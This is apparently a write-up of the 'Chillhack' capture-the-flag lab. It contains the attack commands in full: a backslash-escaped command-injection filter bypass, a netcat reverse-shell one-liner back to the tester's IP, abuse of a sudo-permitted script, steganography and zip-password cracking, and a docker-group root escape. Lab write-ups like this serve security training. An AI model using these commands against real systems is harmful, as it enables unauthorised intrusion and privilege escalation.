@@ -1,0 +1,300 @@
+Title: Chillhack
+
+Easy level CTF.  Capture the flags and have fun!
+
+Running nmap scan: 
+nmap -sC -sV $IP
+
+Nmap scan report for 10.10.206.19 (10.10.206.19)
+Host is up (0.57s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.4.23.126
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
+|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
+|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Game Info
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Open ports: 21,22,80
+
+Before manually inspecting the page we run use gobuster in the background for directory bruteforcing
+
+gobuster dir -u http://10.10.206.19 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+As we can see on port we can anonymous access and a file called note.txt
+"Anurodh told me that there is some filtering on strings being put in the command -- Apaar"
+
+we visit the website but nothing appears. i check my gobuster scan and i find a page called /secret
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.206.19
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-mediu
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/07/29 15:56:20 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 313] [--> http://10.10.206.19/images/]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.206.19/css/]   
+/js                   (Status: 301) [Size: 309] [--> http://10.10.206.19/js/]    
+/fonts                (Status: 301) [Size: 312] [--> http://10.10.206.19/fonts/] 
+/secret               (Status: 301) [Size: 313] [--> http://10.10.206.19/secret/]
+
+There is a field that we can run commands.
+As by my first try, using the command "id" i got www-data on the screen
+But when i used ls -la i got the message "Are you a hacker?". So now the note that we found in the ftp might come in handy. It appears there is some filtering going on that we need to bypass
+
+googling for "bypass filter command injection" and after some searching we find at "swisskyrepo /PayloadsAllTheThings" Bypass with backslash and slash, so using w\h\o\a\m\i we get "www-data"
+
+l\s -l\a we get the:
+total 16 drwxr-xr-x 3 root root 4096 Oct 4 2020 . drwxr-xr-x 8 root root 4096 Oct 3 2020 .. drwxr-xr-x 2 root root 4096 Oct 3 2020 images -rw-r--r-- 1 root root 1520 Oct 4 2020 index.php 
+
+so now we wil try to use a reverse shell with backslashes and slashes, see if it executes.
+after some tries, the one that worked was:
+r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.23.126 4444 >/tmp/f
+
+having a netcat listener opened and executing the command, we get our reverse shell.
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Now we do some manual enumeration
+
+we go first to home directory, and the only user we have access is apaar. Inside is a local.txt file that we dont have permissions to open it, but there is something else called ./helpline.sh. 
+
+cat .helpline.sh
+#!/bin/bash
+
+echo
+echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
+echo
+
+read -p "Enter the person whom you want to talk with: " person
+
+read -p "Hello user! I am $person,  Please enter your message: " msg
+
+$msg 2>/dev/null
+
+echo "Thank you for your precious time!"
+
+There is not much we can do by running the program by www-data, so we check if we can run it as another user.
+
+sudo -l 
+
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
+So we can run it as apaar
+
+sudo -u apaar /home/apaar/.helpline.sh
+
+Entering /bin/bash we get shell as apaar, we stabilize our shell again
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+goind through again the /home /etc /opt /var etc directories we did not find anything interesting
+then i used "netstat -a" to check for any active and listening ports
+tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
+tcp        0      0 localhost:9001          0.0.0.0:*               LISTEN     
+tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN  
+
+we found port 9001 and mysql which is port 3306.
+
+We dont have any credentials for mysql so maybe we can find anything in port 9011
+we run curl 127.0.0.1:9001 to check if we get a response
+
+curl 127.0.0.1:9001
+<html>
+<body>
+<link rel="stylesheet" type="text/css" href="style.css">
+        <div class="signInContainer">
+                <div class="column">
+                        <div class="header">
+                                <h2 style="color:blue;">Customer Portal</h2>
+                                <h3 style="color:green;">Log In<h3>
+                        </div>
+                        <form method="POST">
+                                                                <input type="text" name="username" id="username" placeholder="Username" required>
+                                <input type="password" name="password" id="password" placeholder="Password" required>
+                                <input type="submit" name="submit" value="Submit">
+                        </form>
+                </div>
+        </div>
+</body>
+</html>
+
+and it looks like its a web server.
+
+we can do port-forwarding but we can also check for the files on the machine
+
+In /var/www where usually a webserver is located we find a folder /files
+
+we checked the files in here and the contents inside in all files
+
+cat index.php
+<html>
+<body>
+<?php
+        if(isset($_POST['submit']))
+        {
+                $username = $_POST['username'];
+                $password = $_POST['password'];
+                ob_start();
+                session_start();
+                try
+                {
+                        $con = new PDO("mysql:dbname=webportal;host=localhost","root","$HIDDEN");
+                        $con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
+                }
+                catch(PDOException $e)
+                {
+                        exit("Connection failed ". $e->getMessage());
+                }
+                require_once("account.php");
+                $account = new Account($con);
+                $success = $account->login($username,$password);
+                if($success)
+                {
+                        header("Location: hacker.php");
+                }
+        }
+?>
+
+here is a MySQL password in the PHP code
+
+mysql -h localhost -uroot -p
+
+show databases;
+
+use webportal;
+
+select * from users;
+
+we get anurodh and apaar username and passwords
+Trying to use them but they did not work. so it could be a rabbit hole
+
+i went back to check the files and at the contents of "hacker.php" its:
+
+body {
+  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
+}
+h2
+{
+        color:red;
+        font-weight: bold;
+}
+h1
+{
+        color: yellow;
+        font-weight: bold;
+}
+</style>
+<center>
+        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
+        <h1 style="background-color:red;">You have reached this far. </h2>
+        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
+       
+we check for any steganography in the images above.
+
+we open a python server at the /images directory
+
+python3 -m http.server
+
+and in our machine we run
+
+wget http://$IP:8000/$file
+
+using stegseek in our image, we find there is a file called "backup.zip" and that there is no need for a passphrase
+
+so we use steghide extract -sf $filename and get the file
+it's password protected
+
+zip2john backup.zip > hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+and we have the password of the .zip file
+
+looking in to it there is a "source_code.php" 
+cat source_code.php
+
+...REDACTED...
+ if(isset($_POST['submit']))
+        {
+                $email = $_POST["email"];
+                $password = $_POST["password"];
+                if(base64_encode($password) == "$base64_password")
+                { 
+                        $random = rand(1000,9999);?><br><br><br>
+                        <form method="POST">
+                                Enter the OTP: <input type="number" name="otp">
+                                <input type="submit" name="submitOtp" value="Submit">
+                        </form>
+                <?php   mail($email,"OTP for authentication",$random);
+                        if(isset($_POST["submitOtp"]))
+                                {
+                                        $otp = $_POST["otp"];
+                                        if($otp == $random)
+                                        {
+                                                echo "Welcome Anurodh!";
+                                                header("Location: authenticated.php");
+                                        }
+                                        else
+                                        {
+                                                echo "Invalid OTP";
+                                        }
+                                }
+                }
+                else
+                {
+                        echo "Invalid Username or Password";
+                }
+        }
+?>
+</html>
+
+we get the anurodh password in base64 code
+
+echo "endoced_pass" | base64 -d 
+
+and we ssh into the machine with anurodh credentials
+
+anurodh belongs to the group docker
+id
+uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
+
+we check gtfo bins for docker to get root and we can use
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh 
+
+we have root shell
+
+
+
+
+
